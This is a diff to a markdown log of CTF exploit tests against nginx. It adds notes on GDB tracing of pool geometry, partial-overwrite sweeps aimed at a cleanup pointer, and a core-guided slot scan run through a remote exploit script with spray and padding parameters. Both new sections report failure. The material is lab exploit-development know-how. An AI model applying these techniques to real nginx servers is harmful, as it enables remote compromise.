@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-14 23:30:26 CEST
+Last updated: 2026-05-15 00:58:38 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -296,3 +296,58 @@ unsafe core hit: 0x55d484dfdeb7
 ```
 
 Status: partial pass. The VM produces LFI-readable cores and the driver recovers sprayed fake-structure addresses, but this ASLR layout produced no URI-safe target address and therefore no CTF marker proof.
+
+## Debug Twin: GDB Trace Geometry
+
+Purpose: use the non-target clone VM to explain why partial-overwrite parameter sweeps stop short of the victim cleanup pointer.
+
+Setup:
+
+```text
+debug/twin VM: 192.168.1.89:19321
+target VM:     192.168.1.205:19321
+gdb:           allowed only on the debug/twin
+```
+
+Trace script:
+
+```bash
+sudo gdb -q -p $(pgrep -n nginx) -x /vagrant/debug/gdb_trace_request.gdb -ex continue
+```
+
+Observed:
+
+```text
+COPY_CAPTURE prints the vulnerable copy destination and request pool.
+CLEANUP_ADD prints the upload victim cleanup allocation.
+POOL_DESTROY shows whether the corrupted pool cleanup pointer is reached.
+Default geometry lands thousands of bytes before the cleanup slot.
+connection_pool_size=1456 plus an 11-byte set-prefix reaches a 69-byte near miss.
+One more padding step crosses an allocation threshold and loses the target geometry.
+```
+
+Status: pass for diagnosis, fail for exploit proof.
+
+## Core Slot Scan
+
+Purpose: recover many possible fake-cleanup structure addresses from the sprayed POST body, instead of only checking offset zero.
+
+Command shape:
+
+```bash
+./ctf_remote_exploit.py \
+  --host <vm-ip> --port 19321 \
+  --core-guided --target-len <2|3|6> \
+  --upload-victim --a-count 128 --plus-count 2800 \
+  --verbose
+```
+
+Observed on the debug/twin:
+
+```text
+target-len=6: 0 URI-safe / thousands total
+target-len=3: 0 URI-safe / thousands total
+target-len=2: hundreds URI-safe / thousands total
+```
+
+Status: partial pass. Slot discovery works, but trying low-byte-safe slots without matching the victim cleanup pointer high bytes did not produce marker proof.
